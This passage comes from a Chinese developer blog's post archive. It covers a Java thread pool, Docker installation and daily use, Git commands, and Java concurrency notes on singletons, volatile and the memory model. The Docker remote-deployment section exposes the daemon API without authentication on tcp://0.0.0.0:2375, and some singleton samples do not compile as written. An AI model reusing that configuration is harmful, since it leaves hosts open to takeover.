this.setName(THREAD_PREFIX + "head");        this.start();        resetPoolSize();    }    private void createMyThread() {        MyThread myThread = new MyThread(GROUP, THREAD_PREFIX + (seq++));        THREAD_QUEUE.add(myThread);        myThread.start();    }    /**     * 获取线程池大小：每次线程池，新增/销毁线程的时候，调用     */    private void resetPoolSize() {        this.poolSize = THREAD_QUEUE.size();    }    /**     * 线程池，根据工作量，自动调整容量     */    @Override    public void run() {        while (!destroy) {            // 扩展线程池            if (TASK_QUEUE.size() &gt; activePoolSize &amp;&amp; poolSize &lt; activePoolSize) {                for (int i = poolSize; i &lt; activePoolSize; i++) {                    createMyThread();                }                System.out.println("The pool increased to activePoolSize.");                resetPoolSize();            }            if (TASK_QUEUE.size() &gt; maxPoolSize &amp;&amp; poolSize &lt; maxPoolSize) {                for (int i = poolSize; i &lt; maxPoolSize; i++) {                    createMyThread();                }                System.out.println("The pool increased to maxPoolSize.");                resetPoolSize();            }            // 缩减线程池            synchronized (THREAD_QUEUE) {                if (TASK_QUEUE.isEmpty()                        &amp;&amp; THREAD_QUEUE.stream().filter(e -&gt; e.taskStatus == TaskStatus.RUNNING).count() == 0                        &amp;&amp; poolSize &gt; activePoolSize) {                    int releaseCount = poolSize - activePoolSize;                    Iterator&lt;MyThread&gt; it = THREAD_QUEUE.iterator();                    while (it.hasNext()) {                        if (releaseCount &lt;= 0) {                            break;                        }                        MyThread myThread = it.next();                        myThread.close();                        myThread.interrupt();                        it.remove();                        --releaseCount;                        System.out.println(myThread.getName() + " had been released");                    }                    resetPoolSize();                }            }        }        System.out.println(Thread.currentThread().getName() + "---- is dead");    }    public void shutDown() throws InterruptedException {        // 等待现有线程池中任务执行完成        while (!TASK_QUEUE.isEmpty() || THREAD_QUEUE.stream().filter(e -&gt; e.taskStatus == TaskStatus.RUNNING).count() &gt; 0) {            Thread.sleep(50);        }        synchronized (THREAD_QUEUE) {            // 进行关停销毁            System.out.println("The pool is ready to destroy");            Iterator&lt;MyThread&gt; it = THREAD_QUEUE.iterator();            while (it.hasNext()) {                MyThread myThread = it.next();                if (myThread.taskStatus == TaskStatus.BLOCKED) {                    // waiting中的线程                    myThread.close();                    myThread.interrupt();                    it.remove();                }            }            System.out.println("The thread pool disposed");            resetPoolSize();            destroy = true;        }        System.out.println("All threads had been destroyed");    }    public void submit(Runnable runnable) {        if (destroy)            throw new IllegalStateException("The thread pool already destroy and not allow submit task.");        synchronized (TASK_QUEUE) {            if (TASK_QUEUE.size() &gt; queueSize) {                // 处理能力之外的任务，处理措施                discardPolicy.discard();            }            TASK_QUEUE.addLast(runnable);            TASK_QUEUE.notifyAll();        }    }    public interface DiscardPolicy {        void discard() throws DiscardException;    }    public static class DiscardException extends RuntimeException {        public DiscardException(String message) {            super(message);        }    }    public enum TaskStatus {        FREE, RUNNING, BLOCKED, DEAD;    }    private class MyThread extends Thread {        private volatile TaskStatus taskStatus = TaskStatus.FREE;        public MyThread(ThreadGroup group, String name) {            super(group, name);        }        @Override        public void run() {            OUTER:            while (this.taskStatus != TaskStatus.DEAD) {                Runnable runnable = null;                synchronized (TASK_QUEUE) {                    while (TASK_QUEUE.isEmpty()) {                        try {                            // 任务队列为空，线程等待，让出monitor                            this.taskStatus = TaskStatus.BLOCKED;                            TASK_QUEUE.wait();                        } catch (InterruptedException e) {                            // 任务队列存入数据，被唤醒，重新抢锁处理                            break OUTER;                        }                    }                    runnable = TASK_QUEUE.removeFirst();                }                if (runnable != null) {                    this.taskStatus = TaskStatus.RUNNING;                    runnable.run();                    this.taskStatus = TaskStatus.FREE;                }            }        }        public void close() {            this.taskStatus = TaskStatus.DEAD;        }    }}
import java.util.stream.IntStream;/** * 线程池测试类 */public class SimpleThreadTest {    public static void main(String[] args) throws InterruptedException {        SimpleThreadPool threadPool = new SimpleThreadPool();        IntStream.rangeClosed(0, 40)                .forEach(index -&gt; {                    threadPool.submit(() -&gt; {                                try {                                    Thread.sleep(1_000L);                                    System.out.println("Task " + index + " be serviced by " + Thread.currentThread().getName());                                } catch (InterruptedException e) {                                    e.printStackTrace();                                }                            }                    );                });        // Thread.sleep(10_000);        threadPool.shutDown();    }}
]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 安装Docker</title>
    <url>/20221030/d288da69.html</url>
    <content><![CDATA[1.卸载旧版本Docker
#卸载旧版本dockersudo apt-get remove docker docker-engine docker-ce docker.io  #清空旧版docker占用的内存sudo apt-get remove --auto-remove docker#更新系统源sudo apt-get update
2.配置安装环境
sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common
3. 添加阿里云的docker GPG密钥
curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -
4. 添加阿里镜像源
sudo add-apt-repository "deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"#更新sudo apt-get update
5. 查看有哪些版本
apt-cache madison docker-ce

6. 安装最新版/指定版本
#安装最新版sudo apt-get install -y docker-ce#安装5:19.03.6~3-0~ubuntu-bionic版sudo apt-get install -y docker-ce=5:19.03.6~3-0~ubuntu-bionic
7. 重启Docker
sudo service docker restart#或者sudo systemctl restart docker
8. 查看Docke版本
sudo docker version
9. 配置阿里容器镜像加速器



针对Docker客户端版本大于 1.10.0 的用户


修改daemon配置文件/etc/docker/daemon.json来使用加速器
创建配置文件目录$ sudo mkdir /etc/docker编辑配置文件，如果文件不存在，以下命令会自动创建。$ sudo nano /etc/docker/daemon.json将配置信息粘贴到配置文件中，配置信息为 json 格式，可以根据实际需要设置多个国内的镜像服务器。{  "registry-mirrors": [    "https://hub-mirror.c.163.com",    "https://mirror.baidubce.com"  ]}


重启 Docker 服务
$ sudo systemctl daemon-reload $ sudo systemctl restart docker


检查设置是否生效
$ sudo docker info结果中显示了我们设置的镜像服务器地址，则说明设置已经生效，返回的信息类似下面这样：Registry Mirrors: https://hub-mirror.c.163.com/


10. 运行hello-world验证docker-ce是否安装成功
sudo docker run hello-world
安装成功显示

11. 安装docker-compose

安装pip

sudo apt install python3-pip

更新一下库

sudo apt-get update

更新一下pip

sudo pip3 install --upgrade pip

安装docker-compose

sudo pip3 install docker-compose


如果出错



就更新一下 six


pip3 install six --user -U

查看docker-compose版本

docker-compose --version

]]></content>
      <categories>
        <category>工具|部署</category>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker日常使用记录</title>
    <url>/20221030/868b0954.html</url>
    <content><![CDATA[Docker 升级到最新版本
升级步骤
1、查看系统要求
Docker 要求 CentOS 系统的内核版本高于 3.10 ,查看CentOS的内核版本。
uname -a
2、删除旧版本
yum remove docker  docker-common docker-selinux docker-engine
3、安装需要的软件包
yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的
sudo yum install -y yum-utils device-mapper-persistent-data lvm2
4、设置Docker yum源
sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
5、查看所有仓库中所有docker版本
可以查看所有仓库中所有docker版本,并选择特定的版本安装。
sudo yum install docker-ce-18.06.1.ce  
7、启动
设置为开机启动
systemctl enable docker
启动
systemctl start docker
查看启动状态
systemctl status docker
查看版本
docker version
升级过程中的问题

容器报错Unknown runtime specified docker-run

[root@nginx discourse]# grep -rl 'docker-runc' /var/lib/docker/containers/ | xargs sed -i 's/docker-runc/runc/g'[root@wxb-h5-weixin discourse]# systemctl restart docker
迁移Docker默认存储目录
Docker默认路径存储空间不足，迁移Docker默认存储目录
关掉所有正在运行的容器
# 关闭docker服务docker stop $(docker ps -q -f status=running)systemctl stop docker# 将Docker现目录挪到一个新目录下，这两个目录依照具体情况而定，我的分别是/var/lib/docker和/home/dockermv /var/lib/docker /home/docker将原来的数据备份一份，备份大法好，万一不行还不至于损坏数据cd /hometar zcf docker_file_bak.tar.gz /home/docker
修改启动文件
# 修改服务启动命令，服务的service文件为/lib/systemd/system/docker.service，将里面的内容ExecStart=/usr/bin/dockerd修改为如下：ExecStart=/usr/bin/dockerd -g /home/docker# 重新加载修改后的service文件systemctl daemon-reload
重启
# 启动Docker服务systemctl start docker验证修改成功docker info | grep "Docker Root Dir"
IDEA远程一键部署Springboot到Docker
一、开发前准备
1. Docker的安装可以参考https://docs.docker.com/install/
2. 配置docker远程连接端口
vi /usr/lib/systemd/system/docker.service
找到 ExecStart，在最后面添加 -H tcp://0.0.0.0:2375，如下图所示

3. 重启docker
systemctl stop dockersystemctl start docker
4. 开放端口
firewall-cmd --zone=public --add-port=2375/tcp --permanent
5. Idea安装插件,重启

6. 连接远程docker
(1) 编辑配置


(3) 连接成功，会列出远程docker容器和镜像

二、新建项目
1. 创建springboot项目
项目结构图

(1) 配置pom文件
&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0"         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;docker-demo&lt;/groupId&gt;    &lt;artifactId&gt;com.demo&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;parent&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;        &lt;version&gt;2.0.2.RELEASE&lt;/version&gt;        &lt;relativePath /&gt;    &lt;/parent&gt;    &lt;properties&gt;         &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;         &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;         &lt;docker.image.prefix&gt;com.demo&lt;/docker.image.prefix&gt;         &lt;java.version&gt;1.8&lt;/java.version&gt;    &lt;/properties&gt;    &lt;build&gt;        &lt;plugins&gt;          &lt;plugin&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;          &lt;/plugin&gt;        &lt;plugin&gt;           &lt;groupId&gt;com.spotify&lt;/groupId&gt;           &lt;artifactId&gt;docker-maven-plugin&lt;/artifactId&gt;           &lt;version&gt;1.0.0&lt;/version&gt;           &lt;configuration&gt;              &lt;dockerDirectory&gt;src/main/docker&lt;/dockerDirectory&gt;              &lt;resources&gt;                &lt;resource&gt;                    &lt;targetPath&gt;/&lt;/targetPath&gt;                    &lt;directory&gt;${project.build.directory}&lt;/directory&gt;                    &lt;include&gt;${project.build.finalName}.jar&lt;/include&gt;                &lt;/resource&gt;              &lt;/resources&gt;           &lt;/configuration&gt;        &lt;/plugin&gt;        &lt;plugin&gt;            &lt;artifactId&gt;maven-antrun-plugin&lt;/artifactId&gt;            &lt;executions&gt;                 &lt;execution&gt;                     &lt;phase&gt;package&lt;/phase&gt;                    &lt;configuration&gt;                        &lt;target&gt;                            &lt;copy todir="src/main/docker" file="target/${project.artifactId}-${project.version}.${project.packaging}"&gt;&lt;/copy&gt;                        &lt;/target&gt;                     &lt;/configuration&gt;                    &lt;goals&gt;                        &lt;goal&gt;run&lt;/goal&gt;                    &lt;/goals&gt;                    &lt;/execution&gt;            &lt;/executions&gt;        &lt;/plugin&gt;       &lt;/plugins&gt;    &lt;/build&gt;&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;        &lt;scope&gt;test&lt;/scope&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;log4j&lt;/groupId&gt;        &lt;artifactId&gt;log4j&lt;/artifactId&gt;        &lt;version&gt;1.2.17&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;&lt;/project&gt;
(2) 在src/main目录下创建docker目录，并创建Dockerfile文件
FROM openjdk:8-jdk-alpineADD *.jar app.jarENTRYPOINT ["java","-Djava.security.egd=file:/dev/./urandom","-jar","/app.jar"]
(3) 在resource目录下创建application.properties文件
logging.config=classpath:logback.xmllogging.path=/home/developer/app/logs/server.port=8990
(4) 创建DockerApplication文件
@SpringBootApplicationpublic class DockerApplication {    public static void main(String[] args) {        SpringApplication.run(DockerApplication.class, args);    }}
(5) 创建DockerController文件
@RestControllerpublic class DockerController {    static Log log = LogFactory.getLog(DockerController.class);    @RequestMapping("/")    public String index() {        log.info("Hello Docker!");        return "Hello Docker!";    }}
(6) 增加配置



Image tag : 指定镜像名称和tag，镜像名称为 docker-demo，tag
Bind ports : 绑定宿主机端口到容器内部端口。格式为[宿主机端口]:[容器内部端口]
Bind mounts : 将宿主机目录挂到到容器内部目录中。格式为[宿主机目录]:[容器内部目录]。这个springboot项目会将日志打印在容器 /home/developer/app/logs/ 目录下，将宿主机目录挂载到容器内部目录后，那么日志就会持久化容器外部的宿主机目录中。

(7) Maven打包

(8) 运行


先pull基础镜像，然后再打包镜像，并将镜像部署到远程docker运行

这里我们可以看到镜像名称为docker-demo:1.1，docker容器为docker-server
(9) 运行成功

(10) 浏览器访问

(11) 日志查看

进入容器命令行
docker container lsdocker exec -it 3052dd731d05  bash
查看容器内进程运行信息
# 获取容器ID docker container ls|grep 7.0.0 # 查看进程信息docker top ac6f540b3cd4
修改host映射
# Docker 修改host映射 https://cloud.tencent.com/developer/article/1175087&gt; echo "1.2.3.4 test.zt.ss.com" &gt;&gt; /etc/hosts
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Git</title>
    <url>/20221026/69c3279c.html</url>
    <content><![CDATA[场景命令
一、切换分支临时处理之后恢复
经常有这样的事情发生，当你正在进行项目中某一部分的工作，里面的东西处于一个比较杂乱的状态，而你想转到其他分支上进行一些工作。问题是，你不想提交进行了一半的工作。解决这个问题的办法就是git stash命令。
现在你在分值aaa，已经做了一些修改，现在想要分支bbb做一些事情，但又不想提交aaa上的一些修改：
# 保存分支aaa的工作状态git stash# 切换到分支bbbgit checkout bbb# 在分支bbb上做一些操作后，返回分支aaagit checkout aaa# 恢复之前的工作状态git stash apply 或者 git stash pop
二、处理 Git 忘记切分支修改了代码的情况
有时候没注意分支，直接在 master 上做开发了，假设你现在在 master 分支上已经修改了文件：
# 把当前未提交到本地（和服务器）的代码推入到 Git 的栈中：$ git stash# 查看效果：$ git status # 切换分支：$ git branch dev # 还原代码：$ git stash apply
三、本地新建分支后，同步到远程不存在的分支
$ git push local-branch-name:remote-branch-name
四、撤销某次commit
# 先找到commit id$ git log# 撤销$ git reset --hard commit_id
五、重命名分支
1、本地分支重命名 git branch -m oldName  newName 2、将重命名后的分支推送到远程git push origin newName
六、分支覆盖
git checkout pre-releasegit reset --hard origin/developgit push -f
七、查看日志
git log --graph --pretty=oneline --abbrev-commit
八、合并多个commit为另外的总commit
参考：https://backlog.com/git-tutorial/cn/stepup/stepup7_5.html
当前分支：分支1
待合并分支：分支2
$ git checkout -b 分支2 origin/分支2$ git checkout 分支1$ git merge --squash 分支2$ git commit -m 'PDF fix1'$ git push origin
实际应用
git fetch origin -pgit pullgit branch -m  feature-11111 feature-11111-1git push origin --delete feature-11111git checkout -b dev origin/devgit branch -m dev feature-11111git checkout feature-11111git push origin feature-11111git branch -m feature-11111 ddgit checkout -b feature-11111 origin/feature-11111git branch -D ddgit merge --squash feature-11111-1git commit -m 简介git push origin feature-11111git branch -D feature-11111-1git branch -m feature-11111 ddgit checkout -b feature-11111 origin/feature-11111git branch -D dd
九、解决git文件名大小写无法修改的问题
git默认配置为忽略大小写，因此无法正确检测大小写的更改运行：git config core.ignorecase false关闭git忽略大小写配置，即可检测到大小写名称更改
十、如何快速关联/ 修改 Git 远程仓库地址
常用命令
一、流程图示

Git中几个专用名词的译名如下：
Workspace：工作区Index / Stage：暂存区Repository：仓库区（或本地仓库）Remote：远程仓库
二、新建代码库
# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url]
三、配置
Git的设置文件为.gitconfig，Git的配置分为两种：

全局配置：在用户主目录下
在项目目录下

注意：在当前项目下面查看的配置（git config --list）是全局配置 + 当前项目的配置，使用的时候会优先使用当前项目的配置；
一般公司项目都是在GitLab上的，所以可以在项目根目录进行单独配置，不用全局设置，以免影响其他远程仓库如GitHub的使用。
# 显示当前的Git配置$ git config --list# 编辑Git配置文件$ git config -e [--global]# 设置提交代码时的用户信息$ git config [--global] user.name "[name]"$ git config [--global] user.email "[email address]"
四、增加/删除文件
# 添加指定文件到暂存区$ git add [file1] [file2] ...# 添加指定目录到暂存区，包括子目录$ git add [dir]# 添加当前目录的所有文件到暂存区$ git add .# 添加每个变化前，都会要求确认# 对于同一个文件的多处变化，可以实现分次提交$ git add -p# 删除工作区文件，并且将这次删除放入暂存区$ git rm [file1] [file2] ...# 停止追踪指定文件，但该文件会保留在工作区$ git rm --cached [file]# 改名文件，并且将这个改名放入暂存区$ git mv [file-original] [file-renamed]
五、代码提交
# 提交暂存区到仓库区$ git commit -m [message]# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ...
六、分支
# 列出所有本地分支$ git branch# 列出所有远程分支$ git branch -r# 列出所有本地分支和远程分支$ git branch -a# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 新建一个分支，指向指定commit$ git branch [branch] [commit]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 切换到上一个分支$ git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit]# 删除分支$ git branch -d [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch]
七、标签
# 列出所有tag$ git tag# 新建一个tag在当前commit$ git tag [tag]# 新建一个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs/tags/[tagName]# 查看tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag]
八、查看信息
# 显示有变更的文件$ git status# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件$ git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat "@{0 day ago}"# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog
九、远程同步
# 下载远程仓库的所有变动$ git fetch [remote]# 显示所有远程仓库$ git remote -v# 显示某个远程仓库的信息$ git remote show [remote]# 增加一个新的远程仓库，并命名$ git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]# 上传本地指定分支到远程仓库$ git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force# 推送所有分支到远程仓库$ git push [remote] --all
十、撤销
# 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 撤销git add# 如果是撤销所有的已经add的文件:  git reset HEAD .# 如果是撤销某个文件或文件夹（filename：文件名或者文件夹名）git reset HEAD -filename# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]# 暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop
十一、其他
# 生成一个可供发布的压缩包$ git archive
给本地分支添加备注信息
安装全局插件
npm i -g git-br
查看备注信息（安装插件）
git-br
查看信息（未安装插件）
git config branch.feature_20150713_hd-123.description
给分支添加备注
git config branch.feature_20150713_hd-123.description 海南放款
问题记录
SECURITY WARNING
$ git pullwarning: ----------------- SECURITY WARNING ----------------warning: | TLS certificate verification has been disabled! |warning: ---------------------------------------------------warning: HTTPS connections may not be secure. See https://aka.ms/gcm/tlsverify for more information.warning: ----------------- SECURITY WARNING ----------------warning: | TLS certificate verification has been disabled! |warning: ---------------------------------------------------warning: HTTPS connections may not be secure. See https://aka.ms/gcm/tlsverify for more information.warning: ----------------- SECURITY WARNING ----------------warning: | TLS certificate verification has been disabled! |warning: ---------------------------------------------------warning: HTTPS connections may not be secure. See https://aka.ms/gcm/tlsverify for more information.warning: fetch updated the current branch head. fast-forwarding your working tree from
解决
git config --global http.sslVerify true
遇到问题
使用代理后：
D:\_NoteSpace\Hexo\hmxyl&gt;git clone https://github.com/kaiiiz/hexo-theme-book.git themes/bookCloning into 'themes/book'...fatal: unable to access 'https://github.com/kaiiiz/hexo-theme-book.git/': Failed to connect to github.com port 443 after 21100 ms: Couldn't connect to server
解决：
git config --global --unset https.proxygit config --global https.proxy 127.0.0.1:7890git config --global http.proxy 127.0.0.1:7890
]]></content>
      <categories>
        <category>工具|部署</category>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程设计模式</title>
    <url>/20221101/8c062783.html</url>
    <content><![CDATA[
Chapter1：单例设计模式（七种设计方式）

Java高并发编程详解：第十四章

饿汉式
public class SingletonObject1 {    private static SingletonObject1 instance = new SingletonObject1();    private SingletonObject1() {    }    public SingletonObject1 getInstance() {        return instance;    }}
instance作为类变量，在主动使用SingletonObject1的时候，instance会被加载，包括其中的实例变量也会得到初始化。

保证单例的唯一性
instance被ClassLoader加载很长时间后才会被使用 ，所有instance所占用的堆内存会被占用很久（instance实例比较大，就会占用比较大的堆内存）

懒汉式（懒加载）
public class SingletonObject2 {    private static SingletonObject2 instance;    private SingletonObject2() {    }    public SingletonObject2 getInstance() {        if (instance == null) {            instance = new SingletonObject2();        }        return instance;    }}


多线程下，可能会存在多个实例，不能保证单例的唯一性



懒汉式+同步方法
public class SingletonObject3 {    private static SingletonObject3 instance;    private SingletonObject3() {    }    public synchronized static SingletonObject3 getInstance() {        if (instance == null)            instance = new SingletonObject3();        return instance;    }}


保证单例的唯一性


每次读取 都需要抢锁，同一时间只能有一个线程访问，性能低


Double Check
import java.net.Socket;import java.sql.Connection;public class SingletonObject4 {    // 实例变量    private byte[] data = new byte[1024];    private Connection connection;    private Socket socket;    private static SingletonObject4 instance = null;    private SingletonObject4() {        // 初始化connection        this.connection        // 初始化socket        this.socket    }    public static SingletonObject4 getInstance() {        // 当instance为null时，进入同步代码块，可避免每次读取都进入        if (instance == null) {            // 只有一个线程能获取到SingletonObject4.classg关联的monitor            synchronized (SingletonObject4.class) {                // 判断如果instance为null时重建                if (instance == null)                    instance = new SingletonObject4();            }        }        return instance;    }}
根据JVM运行时指令重排序和Happens-Before规则，instance、connection和 socket 的实例化顺序并无前后关系的约束，那么极有可能是instance最先被实例化，而conn和sock并未完成实例化，并未完成初始化的实例调用其方法会抛出空指针异常

Volatile + Double Check
private volatile static SingletonObject4 instance = null;

Double Check 方法调整下，SingletonObject4 实例化的过程中不允许重排序。
volatile 也不是线程安全的

Holder方式（推荐1）
public class SingletonObject6 {    private SingletonObject6() {    }    // 在静态内部类中持有SingletonObject6的实例，并且可被直接初始化    private static class InstanceHolder {        private final static SingletonObject6 instance = new SingletonObject6();    }    // 调用getInstance方法，实际上是获得InstanceHolder的instance静态属性    public static SingletonObject6 getInstance() {        return InstanceHolder.instance;    }}
当InstanceHolder被主动引用的时候，才会创建SingletonObject6的实例（static 主动加载）
枚举方式（推荐2）
public class SingletonObject7 {    private SingletonObject7() {        System.out.println("3-----------");    }    private enum Singleton {        INSTANCE;        private final SingletonObject7 instance;        Singleton() {            System.out.println("2-----------");            instance = new SingletonObject7();        }        SingletonObject7 getInstance() {            System.out.println("4-----------");            return this.instance;        }    }    public static SingletonObject7 getInstance() {        System.out.println("1-----------");        return Singleton.INSTANCE.getInstance();    }    public static void main(String[] args) {        System.out.println(SingletonObject7.getInstance().hashCode());        System.out.println(SingletonObject7.getInstance().hashCode());    }}
输出
1-----------2-----------3-----------4-----------18360192401-----------4-----------1836019240
Chapter2：WaitSet（等待池）


所有的对象都会有一个wait set, 用来存放调用了该对象wait方法之后进入了block状态的线程


线程被notify之后，进入runnable状态，不一定立即得到执行


线程从wait set 中被唤醒的顺序不一定是FIFO


线程从wait set 中被唤醒之后，需要重新抢锁。抢到锁之后，根据wait时记录的执行代码地址，进行==地址恢复==，继续往后执行。


Chapter3：volatile 关键字

Java高并发编程详解：第十二章、第十三章

public class VolatileTest {    private volatile static int INIT_VALUE = 0;    private final static int MAX_VALUE = 5;    public static void main(String[] args) {        new Thread(() -&gt; {            int localValue = INIT_VALUE;            while (localValue &lt; MAX_VALUE) {                if (localValue != INIT_VALUE) {                    System.out.printf("The value updated from [%d] to [%d]\n", localValue, INIT_VALUE);                    localValue = INIT_VALUE;                }            }        }, "READER").start();        new Thread(() -&gt; {            int localValue = INIT_VALUE;            while (localValue &lt; MAX_VALUE) {                INIT_VALUE = ++localValue;                System.out.printf("Update the value to [%d]\n", INIT_VALUE);                try {                    Thread.sleep(500);                } catch (InterruptedException e) {                    e.printStackTrace();                }            }        }, "WRITER").start();    }}
输出结果
Update the value to [1]The value updated from [0] to [1]Update the value to [2]The value updated from [1] to [2]Update the value to [3]The value updated from [2] to [3]The value updated from [3] to [4]Update the value to [4]The value updated from [4] to [5]Update the value to [5]
CPU缓存一致性问题
	- 解决方式1：总线加锁方式
	- 解决方式2：CPU高速缓存一致性协议

​		在现代计算机中，CPU 的速度是极高的，如果 CPU 需要存取数据时都直接与内存打交道，在存取过程中，CPU 将一直空闲，这是一种极大的浪费，所以，为了提高处理速度，CPU 不直接和内存进行通信，而是在 CPU 与内存之间加入很多寄存器，多级缓存，它们比内存的存取速度高得多，这样就解决了 CPU 运算速度和内存读取速度不一致问题。
​		由于 CPU 与内存之间加入了缓存，在进行数据操作时，先将数据从内存拷贝到缓存中，CPU 直接操作的是缓存中的数据。但在多处理器下，将可能导致各自的缓存数据不一致（这也是可见性问题的由来），为了保证各个处理器的缓存是一致的，就会实现缓存一致性协议，而嗅探是实现缓存一致性的常见机制。

​		在缓存一致性协议中最为出名的时Intel的==MESI==协议。MESI协议保证了每个缓存中使用的共享变量副本是一致的，她的大致思想是：当CPU在操作Cache中的数据时，如果发现该变量是一个共享变量，也就是说在其他的CPU Cache 中也存在一个副本，那么进行如下操作：
​		① 读取操作，不做任何处理，只是将Cache中的数据读取到寄存器
​		② 写入操作，发出信号通知其他CPU将该变量的Cache line置为无效标志，其他CPU在进行该变量读取数据的时候就不得不到主内存中再次获取。
Java内存模型JMM（Java Memory Model）
​		Java的内存模型决定了一个线程对共享变量的写入如何让其他线程可见，Java内存模型定义了线程和主内存之间的抽象关系

共享变量存储于主内存之中，每个线程都可以访问。
每个线程都有私有的工作内存（或者叫做本地内存）
线程不能直接操作主内存，只是先操作了工作内存之后，才写入主内存
工作内存和Java内存模型一样，也是一个抽象的概念，其实并不存在。它涵盖了缓存、寄存器、编译器优化以及硬件等。


JMM与并发编程的三大特性
原子性
一个操作或者多个操作，要么所有的操作全部都得到了执行并且不会受到任何因素的干扰而中断，要么所有的操作都不执行
JMM 仅保证了基本数据类型的读写的原子性操作，其他均不保证。如果想要保证某段代码具有原子性，需要使用synchronized 或者 JUC 中的lock。如果想要int等类型的自增操作具有原子性，可以使用JUC包下的原子封装类型：`java.util.concurrent.atomic`
可见性
Java提供了以下三种方式保证可见性①volatile关键字②synchronized关键字③JUC提供的显示锁Lock 
有序性
Java提供了以下三种方式保证有序性①volatile关键字②synchronized关键字③JUC提供的显示锁Lock 
Happens-before原则：JMM具备的天生的有序性规则


程序次序规则
